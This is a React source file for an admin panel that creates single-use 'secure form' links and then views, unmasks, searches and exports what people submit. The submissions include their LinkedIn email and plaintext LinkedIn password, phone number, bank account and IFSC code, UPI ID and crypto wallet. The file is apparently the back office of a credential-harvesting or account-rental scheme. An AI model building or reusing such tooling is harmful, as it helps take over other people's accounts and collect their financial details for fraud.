import { useState, useRef, useEffect } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import { Link, useLocation } from "wouter";
import {
  Loader2,
  Search,
  Copy,
  Check,
  Eye,
  EyeOff,
  FileDown,
  RefreshCw,
  Trash2,
} from "lucide-react";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Badge } from "@/components/ui/badge";
import useDebounce from "@/hooks/useDebounce";

const API_URI = "https://tech-in-rent.onrender.com";

const apiRequest = async (method, url, requestData = null) => {
  const options = {
    method,
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${localStorage.getItem("adminToken") || ""}`,
    },
    credentials: "include",
  };

  if (requestData) {
    options.body = JSON.stringify(requestData);
  }

  const response = await fetch(url, options);
  if (!response.ok) {
    let errorBody;
    try {
      errorBody = await response.json();
      throw new Error(
        errorBody.message ||
          `API call failed on ${url} with status ${response.status}`
      );
    } catch (jsonError) {
      // If JSON parsing fails, get status text
      throw new Error(
        `API call failed on ${url}: ${response.status} ${response.statusText}`
      );
    }
  }

  return response.json();
};

export default function SecureFormAdmin() {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [searchTerm, setSearchTerm] = useState("");
  const [debouncedSearch] = useDebounce(searchTerm, 500);
  const [filter, setFilter] = useState("all");
  const [showPasswords, setShowPasswords] = useState({});
  const [selectedSubmission, setSelectedSubmission] = useState(null);
  const [viewDetailOpen, setViewDetailOpen] = useState(false);
  const [newUrlDialogOpen, setNewUrlDialogOpen] = useState(false);
  const [newUrl, setNewUrl] = useState("");
  const [copySuccess, setCopySuccess] = useState(false);
  const [activeFormId, setActiveFormId] = useState("");
  const [debouncedFormId] = useDebounce(activeFormId, 500);
  const [showNewUrlBanner, setShowNewUrlBanner] = useState(false);
  const newUrlBannerRef = useRef(null);
  const [, setLocation] = useLocation();

  // Fetch all forms
  const {
    data: allFormsData = [],
    isLoading: isLoadingForms,
    error: formsError,
  } = useQuery({
    queryKey: ["all-forms"],
    queryFn: async () => {
      const res = await apiRequest("GET", `${API_URI}/api/forms`);
      console.log("Forms fetched:", res); // Debug
      return Array.isArray(res.data) ? res.data : [];
    },
  });

  const allForms = Array.isArray(allFormsData) ? allFormsData : [];
  const allowedFormIds = allForms.map((f) => String(f.formId));
  const isValidFormId = (val) =>
    typeof val === "string" && val.length > 0 && allowedFormIds.includes(val);

  // Fetch all responses summary
  const { data: allResponsesData = [] } = useQuery({
    queryKey: ["all-responses-summary"],
    queryFn: async () => {
      const res = await apiRequest("GET", `${API_URI}/api/admin/all-responses`);
      console.log("All responses fetched:", res); // Debug
      return Array.isArray(res.data) ? res.data : [];
    },
  });

  const formObjectIdToCount = allResponsesData.reduce((acc, resp) => {
    const key = String(resp.formId);
    acc[key] = (acc[key] || 0) + 1;
    return acc;
  }, {});

  // Delete form mutation
  const deleteFormMutation = useMutation({
    mutationFn: async ({ formId }) => {
      console.log("Deleting form with ID:", formId); // Debug
      return await apiRequest("DELETE", `${API_URI}/api/admin/forms/${formId}`);
    },
    onSuccess: () => {
      toast({
        title: "Form deleted",
        description: "The form was removed successfully",
      });
      queryClient.invalidateQueries({ queryKey: ["all-forms"] });
      queryClient.invalidateQueries({ queryKey: ["all-responses-summary"] });
      if (activeFormId && !allowedFormIds.includes(activeFormId)) {
        setActiveFormId("");
      }
    },
    onError: (error) => {
      console.error("Delete form error:", error); // Debug
      const message = error.message.includes("404")
        ? "Form not found. It may have been deleted or the ID is incorrect."
        : error.message;
      toast({
        title: "Failed to delete form",
        description: message,
        variant: "destructive",
      });
    },
  });

  // Set default active form
  useEffect(() => {
    if (!activeFormId && allForms.length > 0) {
      const formWithData = allForms.find(
        (f) => formObjectIdToCount[String(f.formId)] > 0
      );
      const target = formWithData || allForms[0];
      const id = String(target?.formId);
      if (isValidFormId(id)) {
        console.log("Setting default active form:", id); // Debug
        setActiveFormId(id);
      }
    }
  }, [allForms, activeFormId, formObjectIdToCount]);

  // Fetch submissions for active form
  const {
    data: submissions = [],
    isLoading,
    isFetching,
    error: submissionsError,
    refetch,
  } = useQuery({
    queryKey: ["secure-form-submissions", debouncedFormId],
    queryFn: async () => {
      if (!isValidFormId(debouncedFormId)) {
        throw new Error("Invalid form ID");
      }
      const res = await apiRequest(
        "GET",
        `${API_URI}/api/admin/responses/${debouncedFormId}`
      );
      console.log("Submissions fetched for formId", debouncedFormId, ":", res); // Debug
      return Array.isArray(res) ? res : Array.isArray(res.data) ? res.data : [];
    },
    enabled: isValidFormId(debouncedFormId),
  });

  const createUrlMutation = useMutation({
    mutationFn: () => apiRequest("POST", `${API_URI}/api/forms/create`),
    onSuccess: (data) => {
      const fullUrl = `${window.location.origin}/secure-form/${data.formId}`;
      setNewUrl(fullUrl);
      setActiveFormId(data.formId);
      setNewUrlDialogOpen(true);
      setShowNewUrlBanner(true);
      setTimeout(() => {
        try {
          newUrlBannerRef.current?.scrollIntoView({
            behavior: "smooth",
            block: "start",
          });
        } catch {}
      }, 0);
      toast({
        title: "Success",
        description: "Secure form link generated successfully",
      });
      queryClient.invalidateQueries({ queryKey: ["all-forms"] });
      queryClient.invalidateQueries({
        queryKey: ["secure-form-submissions", data.formId],
      });
    },
    onError: (error) => {
      toast({
        title: "Failed to create secure form URL",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const deleteSubmissionMutation = useMutation({
    mutationFn: (id) => {
      console.log("Deleting submission with ID:", id); // Debug
      return apiRequest("DELETE", `${API_URI}/api/admin/responses/${id}`);
    },
    onSuccess: () => {
      queryClient.invalidateQueries({
        queryKey: ["secure-form-submissions", debouncedFormId],
      });
      toast({
        title: "Success",
        description: "Submission deleted successfully",
      });
      if (selectedSubmission) {
        setViewDetailOpen(false);
        setSelectedSubmission(null);
      }
    },
    onError: (error) => {
      toast({
        title: "Failed to delete submission",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(newUrl);
      setCopySuccess(true);
      toast({ title: "Copied!", description: "URL copied to clipboard" });
      setTimeout(() => setCopySuccess(false), 2000);
    } catch (error) {
      const textArea = document.createElement("textarea");
      textArea.value = newUrl;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand("copy");
      document.body.removeChild(textArea);
      setCopySuccess(true);
      toast({ title: "Copied!", description: "URL copied to clipboard" });
      setTimeout(() => setCopySuccess(false), 2000);
    }
  };

  const exportToCSV = () => {
    if (submissions.length === 0) return;

    const headers = [
      "ID",
      "Full Name",
      "Phone",
      "Email",
      "LinkedIn Email",
      "LinkedIn Password",
      "Payment Method",
      "Bank Account Number",
      "Bank IFSC",
      "Crypto Wallet ID",
      "Crypto Network",
      "Status",
      "Date",
    ];

    const csvData = submissions.map((submission) => [
      submission._id || "",
      submission.fullName || "",
      submission.phoneNumber || "",
      submission.email || "",
      submission.linkedinEmail || "",
      submission.linkedinPassword || "",
      submission.paymentInfo?.method || "",
      submission.paymentInfo?.bank?.accountNumber || "",
      submission.paymentInfo?.bank?.ifsc || "",
      submission.paymentInfo?.crypto?.walletId || "",
      submission.paymentInfo?.crypto?.network || "",
      submission.read ? "Read" : "Unread",
      submission.createdAt
        ? new Date(submission.createdAt).toLocaleString()
        : "",
    ]);

    const csvContent = [
      headers.join(","),
      ...csvData.map((row) =>
        row.map((cell) => `"${String(cell).replace(/"/g, '""')}"`).join(",")
      ),
    ].join("\n");

    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.setAttribute("href", url);
    link.setAttribute(
      "download",
      `secure-form-submissions-${new Date().toISOString().split("T")[0]}.csv`
    );
    link.style.visibility = "hidden";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const togglePasswordVisibility = (id) => {
    setShowPasswords((prev) => ({ ...prev, [id]: !prev[id] }));
  };

  const viewSubmissionDetails = (submission) => {
    console.log("Opening dialog for submission:", submission); // Debug - remove in prod
    setSelectedSubmission(submission);
    setViewDetailOpen(true);
  };

  const toggleReadMutation = useMutation({
    mutationFn: (id) => {
      console.log("Toggling read status for ID:", id); // Debug
      return apiRequest("PUT", `${API_URI}/api/admin/responses/${id}/read`);
    },
    onSuccess: () => {
      queryClient.invalidateQueries({
        queryKey: ["secure-form-submissions", debouncedFormId],
      });
      if (selectedSubmission) {
        setSelectedSubmission({
          ...selectedSubmission,
          read: !selectedSubmission.read,
        });
      }
    },
    onError: (error) => {
      toast({
        title: "Failed to update read status",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const getFilteredSubmissions = () => {
    let filtered = submissions;
    if (filter === "read") {
      filtered = filtered.filter((submission) => submission.read);
    } else if (filter === "unread") {
      filtered = filtered.filter((submission) => !submission.read);
    }

    if (debouncedSearch) {
      const term = debouncedSearch.toLowerCase();
      filtered = filtered.filter(
        (submission) =>
          (submission.fullName || "").toLowerCase().includes(term) ||
          (submission.email || "").toLowerCase().includes(term) ||
          (submission.phoneNumber || "").toLowerCase().includes(term) ||
          (submission.linkedinEmail || "").toLowerCase().includes(term)
      );
    }

    return filtered;
  };

  const filteredSubmissions = getFilteredSubmissions();

  return (
    <div className="p-6 secure-form-container light bg-sky-100 min-h-screen">
      <div className="max-w-7xl mx-auto">
        <div className="flex items-center justify-between mb-6">
          <div>
            <h1 className="text-2xl font-bold text-gray-900">
              Secure Form Submissions
            </h1>
            <p className="text-gray-500">
              {activeFormId
                ? `Viewing submissions for Form ${activeFormId.slice(0, 8)}...`
                : "Manage all secure form submissions and create new form links"}
            </p>
          </div>
          <div className="flex space-x-2">
            <Link href="/admin">
              <Button variant="outline" className="bg-white border-gray-300">
                Back to Admin Dashboard
              </Button>
            </Link>
            <Button
              onClick={() => createUrlMutation.mutate()}
              disabled={createUrlMutation.isPending}
              className="bg-gradient-to-r from-blue-500 to-blue-700 text-white"
            >
              {createUrlMutation.isPending ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Creating...
                </>
              ) : (
                "Generate New Form Link"
              )}
            </Button>
          </div>
        </div>

        {formsError && (
          <Card className="mb-6 bg-white border-red-300">
            <CardContent className="py-4">
              <p className="text-red-600">
                Error loading forms: {formsError.message}
              </p>
              <p className="text-gray-500">
                Please try refreshing or contact support.
              </p>
            </CardContent>
          </Card>
        )}

        {allForms.length > 0 && (
          <Card className="mb-6 bg-white border-gray-300">
            <CardHeader className="pb-3">
              <CardTitle className="text-gray-900">Created Forms</CardTitle>
              <CardDescription className="text-gray-500">
                All generated secure forms. View submissions or delete a form.
              </CardDescription>
            </CardHeader>
            <CardContent className="p-0">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead className="text-gray-900">Form ID</TableHead>
                      <TableHead className="text-gray-900">Created</TableHead>
                      <TableHead className="text-gray-900">
                        Submissions
                      </TableHead>
                      <TableHead className="text-gray-900">Actions</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {allForms.map((form) => {
                      const submissionsCount =
                        formObjectIdToCount[String(form.formId)] || 0;
                      const formIdStr = String(form.formId);
                      return (
                        <TableRow key={form._id} className="bg-white">
                          <TableCell className="font-mono">
                            {formIdStr.slice(0, 8)}...
                          </TableCell>
                          <TableCell>
                            {form.createdAt
                              ? new Date(form.createdAt).toLocaleString()
                              : "N/A"}
                          </TableCell>
                          <TableCell>
                            <Badge
                              variant="outline"
                              className="border-gray-300"
                            >
                              {submissionsCount}
                            </Badge>
                          </TableCell>
                          <TableCell>
                            <div className="flex gap-2">
                              <Button
                                variant="outline"
                                size="sm"
                                className="bg-white border-gray-300"
                                onClick={() => {
                                  if (isValidFormId(formIdStr)) {
                                    setActiveFormId(formIdStr);
                                    window.scrollTo({
                                      top: 0,
                                      behavior: "smooth",
                                    });
                                    refetch();
                                  }
                                }}
                                disabled={!isValidFormId(formIdStr)}
                              >
                                View submissions
                              </Button>
                              <Button
                                variant="outline"
                                size="sm"
                                className="bg-red-50 text-red-700 border-red-300"
                                disabled={deleteFormMutation.isPending}
                                onClick={() => {
                                  if (
                                    window.confirm(
                                      "Delete this form? This will remove the form. Submissions will remain."
                                    )
                                  ) {
                                    deleteFormMutation.mutate({
                                      formId: formIdStr,
                                    });
                                  }
                                }}
                              >
                                Delete form
                              </Button>
                            </div>
                          </TableCell>
                        </TableRow>
                      );
                    })}
                  </TableBody>
                </Table>
              </div>
            </CardContent>
          </Card>
        )}

        {newUrl && showNewUrlBanner && (
          <div ref={newUrlBannerRef}>
            <div className="mb-6 rounded-xl border-2 border-blue-400 bg-white shadow-md p-4">
              <div className="flex items-start justify-between gap-3 flex-col md:flex-row">
                <div className="flex-1">
                  <h2 className="text-base md:text-lg font-semibold text-blue-900 mb-1">
                    New Secure Form Link Ready
                  </h2>
                  <p className="text-sm text-blue-800 mb-3">
                    Share this single-use URL. Copy before closing.
                  </p>
                  <div className="flex gap-2 w-full">
                    <Input
                      value={newUrl}
                      readOnly
                      onFocus={(e) => e.target.select()}
                      className="flex-1 bg-white font-mono text-xs md:text-sm border-gray-300"
                    />
                    <Button onClick={copyToClipboard} variant="default">
                      {copySuccess ? (
                        <Check className="h-4 w-4" />
                      ) : (
                        <Copy className="h-4 w-4" />
                      )}
                    </Button>
                    <Button
                      variant="outline"
                      onClick={() => window.open(newUrl, "_blank")}
                      className="bg-white border-gray-300"
                    >
                      Open
                    </Button>
                  </div>
                </div>
                <div className="pt-2 md:pt-0">
                  <Button
                    variant="ghost"
                    onClick={() => setShowNewUrlBanner(false)}
                    className="text-gray-600"
                  >
                    Dismiss
                  </Button>
                </div>
              </div>
            </div>
          </div>
        )}

        <Card className="mb-6 bg-white border-gray-300">
          <CardHeader className="pb-3">
            <CardTitle className="text-gray-900">Filters and Options</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex flex-col md:flex-row gap-4">
              <Select
                value={isValidFormId(activeFormId) ? activeFormId : ""}
                onValueChange={(val) => {
                  if (isValidFormId(val)) {
                    setActiveFormId(val);
                    refetch();
                  }
                }}
                disabled={isLoadingForms || allForms.length === 0}
              >
                <SelectTrigger className="w-full md:w-[250px] bg-white border-gray-300">
                  <SelectValue
                    placeholder={
                      isLoadingForms
                        ? "Loading forms..."
                        : !allForms.length
                        ? "No forms available"
                        : "Select a form to view submissions"
                    }
                  />
                </SelectTrigger>
                <SelectContent className="bg-white border-gray-300">
                  {isLoadingForms ? null : allForms.length > 0 ? (
                    allForms.map((form) => (
                      <SelectItem key={form._id} value={String(form.formId)}>
                        Form {String(form.formId).slice(0, 8)}... (
                        {new Date(form.createdAt).toLocaleDateString()})
                      </SelectItem>
                    ))
                  ) : (
                    <div className="px-4 py-2 text-gray-500 text-sm">
                      No forms available
                    </div>
                  )}
                </SelectContent>
              </Select>

              <div className="relative flex-1">
                <Search className="absolute left-2 top-2.5 h-4 w-4 text-gray-500" />
                <Input
                  placeholder="Search by name or email..."
                  className="pl-8 bg-white border-gray-300"
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                />
              </div>
              <Select value={filter} onValueChange={setFilter}>
                <SelectTrigger className="w-full md:w-[180px] bg-white border-gray-300">
                  <SelectValue placeholder="Filter by status" />
                </SelectTrigger>
                <SelectContent className="bg-white border-gray-300">
                  <SelectItem value="all">All Submissions</SelectItem>
                  <SelectItem value="unread">Unread</SelectItem>
                  <SelectItem value="read">Read</SelectItem>
                </SelectContent>
              </Select>
              <Button
                variant="outline"
                onClick={() => refetch()}
                className="md:w-[120px] bg-white border-gray-300"
                disabled={isFetching}
              >
                <RefreshCw className="mr-2 h-4 w-4" />
                Refresh
              </Button>
              <Button
                variant="outline"
                onClick={exportToCSV}
                disabled={filteredSubmissions.length === 0}
                className="md:w-[120px] bg-white border-gray-300"
              >
                <FileDown className="mr-2 h-4 w-4" />
                Export
              </Button>
            </div>
          </CardContent>
        </Card>

        {submissionsError && (
          <Card className="bg-white border-red-300 mb-6">
            <CardContent className="py-4">
              <p className="text-red-600">
                Error loading submissions: {submissionsError.message}
              </p>
              <p className="text-gray-500">
                {submissionsError.message.includes("404")
                  ? "The selected form does not exist. Please select a different form or create a new one."
                  : "Unable to load submissions. Please try refreshing or contact support."}
              </p>
            </CardContent>
          </Card>
        )}

        {!activeFormId ? (
          <Card className="bg-white border-gray-300">
            <CardContent className="flex flex-col items-center justify-center h-64">
              <p className="text-lg font-medium text-gray-500 mb-2">
                No form selected
              </p>
              <p className="text-sm text-gray-400">
                Please select a form from the dropdown above to view its
                submissions, or generate a new form link.
              </p>
            </CardContent>
          </Card>
        ) : isLoading ? (
          <div className="flex justify-center items-center h-64">
            <Loader2 className="h-8 w-8 animate-spin text-blue-500" />
          </div>
        ) : filteredSubmissions.length === 0 ? (
          <Card className="bg-white border-gray-300">
            <CardContent className="flex flex-col items-center justify-center h-64">
              <p className="text-lg font-medium text-gray-500 mb-2">
                No submissions found
              </p>
              <p className="text-sm text-gray-400">
                {debouncedSearch || filter !== "all"
                  ? "Try adjusting your filters or select a different form."
                  : "This form has no submissions yet. Share the form link to start collecting information."}
              </p>
            </CardContent>
          </Card>
        ) : (
          <Card className="bg-white border-gray-300">
            <CardContent className="p-0">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead className="text-gray-900">ID</TableHead>
                      <TableHead className="text-gray-900">Full Name</TableHead>
                      <TableHead className="text-gray-900">Phone</TableHead>
                      <TableHead className="text-gray-900">Email</TableHead>
                      <TableHead className="text-gray-900">
                        LinkedIn Email
                      </TableHead>
                      <TableHead className="text-gray-900">
                        LinkedIn Password
                      </TableHead>
                      <TableHead className="text-gray-900">Payment</TableHead>
                      <TableHead className="text-gray-900">Read</TableHead>
                      <TableHead className="text-gray-900">Status</TableHead>
                      <TableHead className="text-gray-900">Date</TableHead>
                      <TableHead className="text-gray-900">Actions</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {filteredSubmissions.map((submission) => (
                      <TableRow
                        key={submission._id}
                        className={!submission.read ? "bg-blue-50" : "bg-white"}
                      >
                        <TableCell className="font-mono">
                          {submission._id?.slice(0, 8) || "N/A"}...
                        </TableCell>
                        <TableCell>{submission.fullName || "N/A"}</TableCell>
                        <TableCell>{submission.phoneNumber || "N/A"}</TableCell>
                        <TableCell>{submission.email || "N/A"}</TableCell>
                        <TableCell>
                          {submission.linkedinEmail || "N/A"}
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center">
                            <span className="mr-2">
                              {showPasswords[submission._id]
                                ? submission.linkedinPassword || "N/A"
                                : "••••••••"}
                            </span>
                            <Button
                              variant="ghost"
                              size="icon"
                              onClick={() =>
                                togglePasswordVisibility(submission._id)
                              }
                              className="h-6 w-6 text-gray-500"
                            >
                              {showPasswords[submission._id] ? (
                                <EyeOff className="h-4 w-4" />
                              ) : (
                                <Eye className="h-4 w-4" />
                              )}
                            </Button>
                          </div>
                        </TableCell>
                        <TableCell>
                          {submission.paymentInfo?.upiId ? (
                            <Badge
                              variant="outline"
                              className="border-gray-300"
                            >
                              UPI
                            </Badge>
                          ) : submission.paymentInfo?.bank?.accountNumber ? (
                            <Badge
                              variant="outline"
                              className="border-gray-300"
                            >
                              Bank
                            </Badge>
                          ) : submission.paymentInfo?.crypto?.walletId ? (
                            <Badge
                              variant="outline"
                              className="border-gray-300"
                            >
                              Crypto
                            </Badge>
                          ) : (
                            <Badge
                              variant="outline"
                              className="border-gray-300"
                            >
                              None
                            </Badge>
                          )}
                        </TableCell>
                        <TableCell>
                          <Button
                            variant="outline"
                            size="sm"
                            disabled={toggleReadMutation.isPending}
                            onClick={() =>
                              toggleReadMutation.mutate(submission._id)
                            }
                            className="bg-white border-gray-300"
                          >
                            {submission.read ? "Mark Unread" : "Mark Read"}
                          </Button>
                        </TableCell>
                        <TableCell>
                          <Badge
                            variant={submission.read ? "default" : "secondary"}
                            className={
                              submission.read
                                ? "bg-green-100 text-green-800"
                                : "bg-yellow-100 text-yellow-800"
                            }
                          >
                            {submission.read ? "Read" : "Unread"}
                          </Badge>
                        </TableCell>
                        <TableCell>
                          {submission.createdAt
                            ? new Date(submission.createdAt).toLocaleString()
                            : "N/A"}
                        </TableCell>
                        <TableCell>
                          <div className="flex space-x-1">
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => viewSubmissionDetails(submission)}
                              className="h-8 w-8 p-0 text-gray-500"
                            >
                              <Eye className="h-4 w-4" />
                            </Button>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() =>
                                deleteSubmissionMutation.mutate(submission._id)
                              }
                              className="h-8 w-8 p-0 text-red-500"
                              disabled={deleteSubmissionMutation.isPending}
                            >
                              <Trash2 className="h-4 w-4" />
                            </Button>
                          </div>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            </CardContent>
            <CardFooter className="py-4 border-t border-gray-300">
              <div className="text-sm text-gray-500">
                Showing {filteredSubmissions.length} of {submissions.length}{" "}
                submissions
              </div>
            </CardFooter>
          </Card>
        )}

        <Dialog
          open={viewDetailOpen}
          onOpenChange={(open) => {
            setViewDetailOpen(open);
            if (!open) setSelectedSubmission(null);
          }}
        >
          <DialogContent className="max-w-3xl dialog-content bg-white border-gray-300">
            <DialogHeader>
              <DialogTitle className="text-gray-900">
                Submission Details
              </DialogTitle>
              <DialogDescription className="text-gray-500">
                {selectedSubmission
                  ? `Complete information for submission #${
                      selectedSubmission._id?.slice(0, 8) || "N/A"
                    }...`
                  : "No submission selected"}
              </DialogDescription>
            </DialogHeader>

            {selectedSubmission ? (
              <div className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">
                      Full Name
                    </h3>
                    <p className="mt-1 text-gray-900">
                      {selectedSubmission.fullName || "Not provided"}
                    </p>
                  </div>
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">Phone</h3>
                    <p className="mt-1 text-gray-900">
                      {selectedSubmission.phoneNumber || "Not provided"}
                    </p>
                  </div>
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">Email</h3>
                    <p className="mt-1 text-gray-900">
                      {selectedSubmission.email || "Not provided"}
                    </p>
                  </div>
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">
                      Date Submitted
                    </h3>
                    <p className="mt-1 text-gray-900">
                      {selectedSubmission.createdAt
                        ? new Date(
                            selectedSubmission.createdAt
                          ).toLocaleString()
                        : "Not provided"}
                    </p>
                  </div>
                </div>

                <div className="border-t pt-4 border-gray-300">
                  <h3 className="text-lg font-medium mb-3 text-gray-900">
                    LinkedIn Credentials
                  </h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <h3 className="text-sm font-medium text-gray-500">
                        LinkedIn Email
                      </h3>
                      <p className="mt-1 text-gray-900">
                        {selectedSubmission.linkedinEmail || "Not provided"}
                      </p>
                    </div>
                    <div>
                      <h3 className="text-sm font-medium text-gray-500">
                        LinkedIn Password
                      </h3>
                      <div className="flex items-center mt-1">
                        <p className="text-gray-900">
                          {showPasswords[selectedSubmission._id]
                            ? selectedSubmission.linkedinPassword ||
                              "Not provided"
                            : "••••••••"}
                        </p>
                        <Button
                          variant="ghost"
                          size="icon"
                          onClick={() =>
                            togglePasswordVisibility(selectedSubmission._id)
                          }
                          className="h-6 w-6 ml-2 text-gray-500"
                        >
                          {showPasswords[selectedSubmission._id] ? (
                            <EyeOff className="h-4 w-4" />
                          ) : (
                            <Eye className="h-4 w-4" />
                          )}
                        </Button>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="border-t pt-4 border-gray-300">
                  <h3 className="text-lg font-medium mb-3 text-gray-900">
                    Payment Information
                  </h3>
                  {selectedSubmission.paymentInfo ? (
                    <div className="space-y-4">
                      {selectedSubmission.paymentInfo.upi && (
                        <div className="border p-3 rounded-md border-gray-300">
                          <h4 className="font-medium text-gray-900">
                            UPI Payment
                          </h4>
                          <p className="text-sm mt-1 text-gray-700">
                            <span className="text-gray-500">UPI ID:</span>{" "}
                            {selectedSubmission.paymentInfo.upi}
                          </p>
                        </div>
                      )}
                      {selectedSubmission.paymentInfo.bank?.accountNumber && (
                        <div className="border p-3 rounded-md border-gray-300">
                          <h4 className="font-medium text-gray-900">
                            Bank Account
                          </h4>
                          <p className="text-sm mt-1 text-gray-700">
                            <span className="text-gray-500">
                              Account Number:
                            </span>{" "}
                            {selectedSubmission.paymentInfo.bank.accountNumber}
                          </p>
                          {selectedSubmission.paymentInfo.bank.ifsc && (
                            <p className="text-sm mt-1 text-gray-700">
                              <span className="text-gray-500">IFSC Code:</span>{" "}
                              {selectedSubmission.paymentInfo.bank.ifsc}
                            </p>
                          )}
                        </div>
                      )}
                      {selectedSubmission.paymentInfo.crypto?.walletId && (
                        <div className="border p-3 rounded-md border-gray-300">
                          <h4 className="font-medium text-gray-900">
                            Crypto Wallet
                          </h4>
                          <p className="text-sm mt-1 text-gray-700">
                            <span className="text-gray-500">
                              Wallet Address:
                            </span>{" "}
                            {selectedSubmission.paymentInfo.crypto.walletId}
                          </p>
                          {selectedSubmission.paymentInfo.crypto.network && (
                            <p className="text-sm mt-1 text-gray-700">
                              <span className="text-gray-500">Network:</span>{" "}
                              {selectedSubmission.paymentInfo.crypto.network}
                            </p>
                          )}
                        </div>
                      )}
                      {!selectedSubmission.paymentInfo.upi &&
                        !selectedSubmission.paymentInfo.bank?.accountNumber &&
                        !selectedSubmission.paymentInfo.crypto?.walletId && (
                          <p className="text-gray-500">
                            No payment information provided
                          </p>
                        )}
                    </div>
                  ) : (
                    <p className="text-gray-500">
                      No payment information provided
                    </p>
                  )}
                </div>
              </div>
            ) : (
              <div className="text-center py-8">
                <p className="text-gray-500">
                  No submission data available. Please select a valid submission
                  or check if responses exist for this form.
                </p>
              </div>
            )}

            <DialogFooter className="flex justify-between items-center">
              <div className="flex items-center">
                {selectedSubmission && (
                  <Badge
                    variant={selectedSubmission.read ? "default" : "secondary"}
                    className={
                      selectedSubmission.read
                        ? "bg-green-100 text-green-800"
                        : "bg-yellow-100 text-yellow-800"
                    }
                  >
                    {selectedSubmission.read ? "Read" : "Unread"}
                  </Badge>
                )}
              </div>
              <div className="space-x-2">
                <Button
                  variant="outline"
                  onClick={() =>
                    deleteSubmissionMutation.mutate(selectedSubmission?._id)
                  }
                  className="bg-red-100 text-red-800 border-red-300"
                  disabled={
                    deleteSubmissionMutation.isPending || !selectedSubmission
                  }
                >
                  <Trash2 className="mr-2 h-4 w-4" /> Delete
                </Button>
                <Button
                  variant="outline"
                  onClick={() => setViewDetailOpen(false)}
                  className="bg-white border-gray-300"
                >
                  Close
                </Button>
              </div>
            </DialogFooter>
          </DialogContent>
        </Dialog>

        <Dialog
          open={newUrlDialogOpen}
          onOpenChange={(open) => {
            setNewUrlDialogOpen(open);
            if (!open) setCopySuccess(false);
          }}
        >
          <DialogContent className="max-w-md dialog-content bg-white border-gray-300">
            <DialogHeader>
              <DialogTitle className="text-gray-900">
                Secure Form Link Generated
              </DialogTitle>
              <DialogDescription className="text-gray-500">
                Share this unique URL with the user to access the secure form
              </DialogDescription>
            </DialogHeader>

            <div className="flex items-center space-x-2">
              <Input
                value={newUrl || ""}
                readOnly
                className="flex-1 bg-white border-gray-300"
              />
              <Button
                size="icon"
                type="button"
                onClick={copyToClipboard}
                className="bg-white border-gray-300"
              >
                {copySuccess ? (
                  <Check className="h-4 w-4 text-green-500" />
                ) : (
                  <Copy className="h-4 w-4 text-gray-500" />
                )}
              </Button>
            </div>

            <p className="text-sm text-amber-600 mt-2">
              <strong>Important:</strong> This URL can only be used once. Save
              it before closing this dialog.
            </p>

            <DialogFooter className="flex gap-2">
              <Button
                variant="outline"
                type="button"
                onClick={() =>
                  window.open(newUrl, "_blank", "noopener,noreferrer")
                }
                className="bg-white border-gray-300"
              >
                Open Link
              </Button>
              <Button
                type="button"
                onClick={() => setNewUrlDialogOpen(false)}
                className="bg-white border-gray-300"
              >
                Close
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
}
